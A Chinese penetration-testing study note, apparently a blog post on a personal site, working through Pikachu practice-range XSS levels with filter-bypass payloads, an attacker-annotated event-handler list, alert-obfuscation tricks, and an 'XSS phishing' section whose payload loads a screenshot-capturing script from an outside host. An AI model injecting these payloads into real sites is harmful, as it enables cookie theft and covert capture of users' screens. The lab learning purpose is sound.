{"title":"渗透测试笔记 - day20 XSS实战","date":"2022-02-09T00:00:00.000Z","date_formatted":{"ll":"Feb 9, 2022","L":"02/09/2022","MM-DD":"02-09"},"link":"2022/02/09/渗透测试笔记 - day20 XSS实战","updated":"2023-03-17T12:07:41.484Z","content":"<h2 id=\"xss盲打\">xss盲打<a title=\"#xss盲打\" href=\"#xss盲打\"></a></h2>\n<p>靶场：Pikachu-XSS盲打</p>\n<p>当xss无法实时得到回显时，注入一些有用的命令可能就能完成一次攻击。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958537.png\" alt=\"image-20220224190804887\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss过滤\">xss过滤<a title=\"#xss过滤\" href=\"#xss过滤\"></a></h2>\n<p>靶场：Pikachu-XSS过滤</p>\n<p>script被过滤时，也可以使用：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;x&quot;</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958475.png\" alt=\"image-20220224190619349\" loading=\"lazy\"><img src=\"C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220224190630147.png\" alt=\"image-20220224190630147\" loading=\"lazy\"></p>\n<h2 id=\"xss特殊字符过滤\">xss特殊字符过滤<a title=\"#xss特殊字符过滤\" href=\"#xss特殊字符过滤\"></a></h2>\n<p>靶场：Pikachu-xss之htmlspecialchars</p>\n<p>使用xss伪协议绕过。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958823.png\" alt=\"image-20220224191035290\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958665.png\" alt=\"image-20220224191042564\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss的href输出\">xss的href输出<a title=\"#xss的href输出\" href=\"#xss的href输出\"></a></h2>\n<p>靶场：Pikachu-xss之href输出</p>\n<p>使用js伪协议</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload：javascript(1)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958323.png\" alt=\"image-20220224214454925\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958837.png\" alt=\"image-20220224214540308\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss的js输出\">xss的js输出<a title=\"#xss的js输出\" href=\"#xss的js输出\"></a></h2>\n<p>靶场：Pikachu-xss之js输出</p>\n<p>使用闭合符闭合语句，使用分号来注入下一条语句。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload: 1&#x27;;alert(1);$aaa=&#x27;1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958975.png\" alt=\"image-20220224191700168\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958491.png\" alt=\"image-20220224191712536\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958060.png\" alt=\"image-20220224191721329\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss的三种类型\">xss的三种类型<a title=\"#xss的三种类型\" href=\"#xss的三种类型\"></a></h2>\n<ul>\n<li>反射型</li>\n</ul>\n<p>即插即用，由后端PHP处理，不存入数据库</p>\n<ul>\n<li>存储型</li>\n</ul>\n<p>输入的输入会存放在数据库里面，造成持续的危害的效果</p>\n<ul>\n<li>\n<p>DOM型</p>\n<p>是一种特殊的反射型XSS，由前端DOM文档处理，不由后端的PHP处理，不存放于数据库</p>\n<h2 id=\"js事件整理\">js事件整理<a title=\"#js事件整理\" href=\"#js事件整理\"></a></h2>\n<ol>\n<li>\n<p>FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件)</p>\n</li>\n<li>\n<p>onAbort() (当用户中止加载图片时)</p>\n</li>\n<li>\n<p>onActivate() (当对象激活时)</p>\n</li>\n<li>\n<p>onAfterPrint() (用户打印或进行打印预览后触发)</p>\n</li>\n<li>\n<p>onAfterUpdate() (从数据源对象更新数据后由数据对象触发)</p>\n</li>\n<li>\n<p>onBeforeActivate() (在对象设置为激活元素前触发)</p>\n</li>\n<li>\n<p>onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(“Copy”)函数触发)</p>\n</li>\n<li>\n<p>onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码)</p>\n</li>\n<li>\n<p>onBeforeDeactivate() (在当前对象的激活元素变化前触发)</p>\n</li>\n<li>\n<p>onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发)</p>\n</li>\n<li>\n<p>onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(“Paste”)函数触发)</p>\n</li>\n<li>\n<p>onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用print()或execCommand(“Print”)函数).</p>\n</li>\n<li>\n<p>onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口)</p>\n</li>\n<li>\n<p>onBeforeUpdate() (从数据源对象更新数据前由数据对象触发)</p>\n</li>\n<li>\n<p>onBegin() (当元素周期开始时由onbegin 事件立即触发)</p>\n</li>\n<li>\n<p>onBlur() (另一个窗口弹出当前窗口失去焦点时触发)</p>\n</li>\n<li>\n<p>onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发)</p>\n</li>\n<li>\n<p>onCellChange() (当数据提供者的数据变化时触发)</p>\n</li>\n<li>\n<p>onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发)</p>\n</li>\n<li>\n<p>onClick() (表单中点击触发)</p>\n</li>\n<li>\n<p>onContextMenu() (用户需要在攻击区域点击右键)</p>\n</li>\n<li>\n<p>onControlSelect() (当用户在一个对象上创建控件选中区时触发)</p>\n</li>\n<li>\n<p>onCopy() (用户需要复制一些东西或使用execCommand(“Copy”)命令时触发)</p>\n</li>\n<li>\n<p>onCut() (用户需要剪切一些东西或使用execCommand(“Cut”)命令时触发)</p>\n</li>\n<li>\n<p>onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能)</p>\n</li>\n<li>\n<p>onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发)</p>\n</li>\n<li>\n<p>onDataSetComplete() (数据源对象中所有数据可用时触发)</p>\n</li>\n<li>\n<p>onDblClick() (用户双击一个表单元素或链接)</p>\n</li>\n<li>\n<p>onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发)</p>\n</li>\n<li>\n<p>onDrag() (在元素正在拖动时触发)</p>\n</li>\n<li>\n<p>onDragEnd() (当用户完成元素的拖动时触发)</p>\n</li>\n<li>\n<p>onDragLeave() (用户在拖动元素离开放置目标时触发)</p>\n</li>\n<li>\n<p>onDragEnter() (用户将对象拖拽到合法拖曳目标)</p>\n</li>\n<li>\n<p>onDragOver() (用户将对象拖拽划过合法拖曳目标)</p>\n</li>\n<li>\n<p>onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口)</p>\n</li>\n<li>\n<p>onDragStart() (当用户开始拖动元素时触发)</p>\n</li>\n<li>\n<p>onDrop() (当拖动元素放置在目标区域时触发)</p>\n</li>\n<li>\n<p>onEnded() (在视频/音频（audio/video）播放结束时触发)</p>\n</li>\n<li>\n<p>onError() (在加载文档或图像时发生错误)</p>\n</li>\n<li>\n<p>onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发)</p>\n</li>\n<li>\n<p>onFilterChange() (当滤镜完成状态变更时触发)</p>\n</li>\n<li>\n<p>onFinish() (当marquee完成滚动时攻击者可以执行攻击)</p>\n</li>\n<li>\n<p>onFocus() (当窗口获得焦点时攻击者可以执行攻击代码)</p>\n</li>\n<li>\n<p>onFocusIn() (当元素将要被设置为焦点之前触发)</p>\n</li>\n<li>\n<p>onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码)</p>\n</li>\n<li>\n<p>onHashChange() (当锚部分发生变化时触发攻击代码)</p>\n</li>\n<li>\n<p>onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码)</p>\n</li>\n<li>\n<p>onInput() (在 <input> 或 <textarea> 元素的值发生改变时触发)</p>\n</li>\n<li>\n<p>onKeyDown() (用户按下一个键的时候触发)</p>\n</li>\n<li>\n<p>onKeyPress() (在键盘按键被按下并释放一个键时触发)</p>\n</li>\n<li>\n<p>onKeyUp() (用户释放一个键时触发)</p>\n</li>\n<li>\n<p>onLayoutComplete() (用户进行完打印或打印预览时触发)</p>\n</li>\n<li>\n<p>onLoad() (攻击者在窗口加载后触发攻击代码)</p>\n</li>\n<li>\n<p>onLoseCapture() (可以由releaseCapture()方法触发)</p>\n</li>\n<li>\n<p>onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发)</p>\n</li>\n<li>\n<p>onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件)</p>\n</li>\n<li>\n<p>onMessage() (当页面收到一个信息时触发事件)</p>\n</li>\n<li>\n<p>onMouseDown() (攻击者需要让用户点击一个图片触发事件)</p>\n</li>\n<li>\n<p>onMouseEnter() (光标移动到一个对象或区域时触发)</p>\n</li>\n<li>\n<p>onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)</p>\n</li>\n<li>\n<p>onMouseMove() (攻击者需要让用户将光标移到一个图片或表格)</p>\n</li>\n<li>\n<p>onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)</p>\n</li>\n<li>\n<p>onMouseOver() (光标移动到一个对象或区域)</p>\n</li>\n<li>\n<p>onMouseUp() (攻击者需要让用户点击一个图片)</p>\n</li>\n<li>\n<p>onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)</p>\n</li>\n<li>\n<p>onMove() (用户或攻击者移动页面时触发)</p>\n</li>\n<li>\n<p>onMoveEnd() (用户或攻击者移动页面结束时触发)</p>\n</li>\n<li>\n<p>onMoveStart() (用户或攻击者开始移动页面时触发)</p>\n</li>\n<li>\n<p>onOffline() (当浏览器从在线模式切换到离线模式时触发)</p>\n</li>\n<li>\n<p>onOnline() (当浏览器从离线模式切换到在线模式时触发)</p>\n</li>\n<li>\n<p>onOutOfSync() (当元素与当前时间线失去同步时触发)</p>\n</li>\n<li>\n<p>onPaste() (用户进行粘贴时或攻击者可以使用execCommand(“Paste”)函数时触发)</p>\n</li>\n<li>\n<p>onPause() (在视频或音频暂停时触发)</p>\n</li>\n<li>\n<p>onPopState() (在窗口的浏览历史（history 对象）发生改变时触发)</p>\n</li>\n<li>\n<p>onProgress() (攻击者可以在一个FLASH加载时触发事件)</p>\n</li>\n<li>\n<p>onPropertyChange() (用户或攻击者需要改变元素属性时触发)</p>\n</li>\n<li>\n<p>onReadyStateChange() (每次 readyState 属性变化时被自动调用)</p>\n</li>\n<li>\n<p>onRedo() (用户返回上一页面时触发)</p>\n</li>\n<li>\n<p>onRepeat() (事件在播放完重复播放时触发)</p>\n</li>\n<li>\n<p>onReset() (用户或攻击者重置表单时触发)</p>\n</li>\n<li>\n<p>onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">SCRIPT</span>&gt;</span>self.resizeTo(500,400);<span class=\"tag\">&lt;/<span class=\"name\">SCRIPT</span>&gt;</span>) </span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>onResizeEnd() (用户完成改变窗体大小时触发)</p>\n</li>\n<li>\n<p>onResizeStart() (用户开始改变窗体大小时触发)</p>\n</li>\n<li>\n<p>onResume() (当元素继续播放时触发)</p>\n</li>\n<li>\n<p>onReverse() (当元素回放时触发)</p>\n</li>\n<li>\n<p>onRowsEnter() (用户或攻击者需要改变数据源中的一行)</p>\n</li>\n<li>\n<p>onRowExit() (用户或攻击者改变数据源中的一行后退出时触发)</p>\n</li>\n<li>\n<p>onRowDelete() (用户或攻击者需要删除数据源中的一行)</p>\n</li>\n<li>\n<p>onRowInserted() (user or attacker would needto insert a row in a data source)</p>\n</li>\n<li>\n<p>onScroll() (用户需要滚动或攻击者使用scrollBy()函数)</p>\n</li>\n<li>\n<p>onSeek() (当用户在元素上执行查找操作时触发)</p>\n</li>\n<li>\n<p>onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: window.document.execCommand(“SelectAll”);)</p>\n</li>\n<li>\n<p>onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: window.document.execCommand(“SelectAll”);)</p>\n</li>\n<li>\n<p>onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: window.document.execCommand(“SelectAll”);)</p>\n</li>\n<li>\n<p>onStart() (在marquee 对象开始循环时触发)</p>\n</li>\n<li>\n<p>onStop() (当用户按下停止按钮或离开页面时触发)</p>\n</li>\n<li>\n<p>onStorage() (当Web Storage更新时触发)</p>\n</li>\n<li>\n<p>onSyncRestored() (当元素与它的时间线恢复同步时触发)</p>\n</li>\n<li>\n<p>onSubmit() (需要用户或攻击者提交表单)</p>\n</li>\n</ol>\n<p>100.onTimeError() (用户或攻击者设置时间属性出现错误时触发)</p>\n<p>101.onTrackChange() (用户或攻击者改变播放列表内歌曲时触发)</p>\n<p>102.onUndo() (用户返回上一浏览记录页面时触发)</p>\n<p>103.onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发)</p>\n<p>104.onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本)</p>\n<p>105.seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)</p>\n</li>\n</ul>\n<h2 id=\"js弹窗函数与冷门标签\">js弹窗函数与冷门标签<a title=\"#js弹窗函数与冷门标签\" href=\"#js弹窗函数与冷门标签\"></a></h2>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">confirm</span>(<span class=\"string\">&quot;xss&quot;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">prompt</span>(<span class=\"string\">&quot;xss&quot;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"string\">&quot;xss&quot;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">BODY</span> <span class=\"attr\">ONLOAD</span>=<span class=\"string\">alert(</span>&#x27;<span class=\"attr\">XSS</span>&#x27;)&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">IFRAME</span> <span class=\"attr\">SRC</span>=<span class=\"string\">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">IFRAME</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Input</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;XSS&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">text</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"js对字符串编码\">js对字符串编码<a title=\"#js对字符串编码\" href=\"#js对字符串编码\"></a></h2>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(string.fromcharcode(49,50,51,52,53,54))<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span> //使用ascii对字符串编码</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:\\u0061lert(1)&quot;</span>&gt;</span>//使用unicode编码</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">x</span>&gt;</span>alert(1)&lt;/script 1=2&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"alert变形\">alert变形<a title=\"#alert变形\" href=\"#alert变形\"></a></h2>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">x</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\">(alert)(&quot;1&quot;)&lt;/script 1=2&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">x</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\">a=alert,a(&quot;1&quot;)&lt;/script 1=2&gt;</span></span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"><span class=\"language-xml\"><span class=\"language-handlebars\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">x</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\">[&quot;1&quot;].find(alert)&lt;/script 1=2&gt;</span></span></span></span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"><span class=\"language-xml\"><span class=\"language-handlebars\"><span class=\"language-xml\"><span class=\"language-handlebars\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">x</span>&gt;</span><span class=\"language-javascript\">al\\<span class=\"title function_\">u0065rt</span>(<span class=\"string\">&quot;1&quot;</span>)&lt;/script <span class=\"number\">1</span>=<span class=\"number\">2</span>&gt;</span></span></span></span></span></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\"><span class=\"language-handlebars\"><span class=\"language-xml\"><span class=\"language-handlebars\"><span class=\"language-xml\"><span class=\"language-handlebars\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">x</span>&gt;</span><span class=\"language-javascript\">top[<span class=\"number\">8680439.</span>.<span class=\"title function_\">toString</span>(<span class=\"number\">30</span>)](<span class=\"string\">&quot;1&quot;</span>)&lt;/script <span class=\"number\">1</span>=<span class=\"number\">2</span>&gt;</span></span></span></span></span></span></span></span></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"xss平台\">xss平台<a title=\"#xss平台\" href=\"#xss平台\"></a></h2>\n<h2 id=\"xss必要知识\">xss必要知识<a title=\"#xss必要知识\" href=\"#xss必要知识\"></a></h2>\n<h3 id=\"cookie\">cookie<a title=\"#cookie\" href=\"#cookie\"></a></h3>\n<p>浏览器使用cookie标识自身身份，用于和服务器交涉时，提交给服务器来获取服务器上保存的用户信息。</p>\n<h3 id=\"session\">session<a title=\"#session\" href=\"#session\"></a></h3>\n<p>用来保存用户在服务器上的使用信息，以便用户短时间内再次访问时可继续操作。session保存至服务器种，用户需使用sessionID来获取自己的session，而session通常保存在cookie中。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112146950.png\" alt=\"image-20220224201651190\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958601.png\" alt=\"image-20220224202504932\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958642.png\" alt=\"image-20220224202750051\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958163.png\" alt=\"image-20220224203042891\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958333.png\" alt=\"image-20220224203212458\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958329.png\" alt=\"image-20220224203406692\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111958809.png\" alt=\"image-20220224203429041\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss钓鱼平台搭建\">xss钓鱼平台搭建<a title=\"#xss钓鱼平台搭建\" href=\"#xss钓鱼平台搭建\"></a></h2>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959213.png\" alt=\"image-20220224215136801\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss钓鱼获取用户截图\">xss钓鱼获取用户截图<a title=\"#xss钓鱼获取用户截图\" href=\"#xss钓鱼获取用户截图\"></a></h2>\n<p>创建js恶意代码：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959199.png\" alt=\"image-20220224215425349\" loading=\"lazy\" class=\"φbp\"></p>\n<p>生成payload</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959012.png\" alt=\"image-20220224215457293\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload：<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://192.168.59.237:7790/blue-lutos/myjs/cutpic.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>将payload插入xss注入点。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959152.png\" alt=\"image-20220224215552291\" loading=\"lazy\" class=\"φbp\"></p>\n<p>执行。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959048.png\" alt=\"image-20220224220350900\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959429.png\" alt=\"image-20220224220411420\" loading=\"lazy\" class=\"φbp\"></p>\n<p>被拦截。未收到任何回返。实验失败。</p>\n","prev":{"title":"渗透测试笔记 - day21 XSS拓展和XXE介绍","link":"2022/02/10/渗透测试笔记 - day21 XSS拓展和XXE介绍"},"next":{"title":"渗透测试笔记 - day18、19 XSS基础 ","link":"2022/02/02/渗透测试笔记 - day18、19 XSS基础 "},"plink":"https://Lq0ne.github.io/2022/02/09/渗透测试笔记 - day20 XSS实战/","toc":[{"id":"xss盲打","title":"xss盲打","index":"1"},{"id":"xss过滤","title":"xss过滤","index":"2"},{"id":"xss特殊字符过滤","title":"xss特殊字符过滤","index":"3"},{"id":"xss的href输出","title":"xss的href输出","index":"4"},{"id":"xss的js输出","title":"xss的js输出","index":"5"},{"id":"xss的三种类型","title":"xss的三种类型","index":"6"},{"id":"js事件整理","title":"js事件整理","index":"7"},{"id":"js弹窗函数与冷门标签","title":"js弹窗函数与冷门标签","index":"8"},{"id":"js对字符串编码","title":"js对字符串编码","index":"9"},{"id":"alert变形","title":"alert变形","index":"10"},{"id":"xss平台","title":"xss平台","index":"11"},{"id":"xss必要知识","title":"xss必要知识","index":"12","children":[{"id":"cookie","title":"cookie","index":"12.1"},{"id":"session","title":"session","index":"12.2"}]},{"id":"xss钓鱼平台搭建","title":"xss钓鱼平台搭建","index":"13"},{"id":"xss钓鱼获取用户截图","title":"xss钓鱼获取用户截图","index":"14"}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"February 9, 2022","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2022/02/09/渗透测试笔记 - day20 XSS实战/\" title=\"渗透测试笔记 - day20 XSS实战\">https://Lq0ne.github.io/2022/02/09/渗透测试笔记 - day20 XSS实战/</a>"},"reading_time":"2939 words in 20 min"}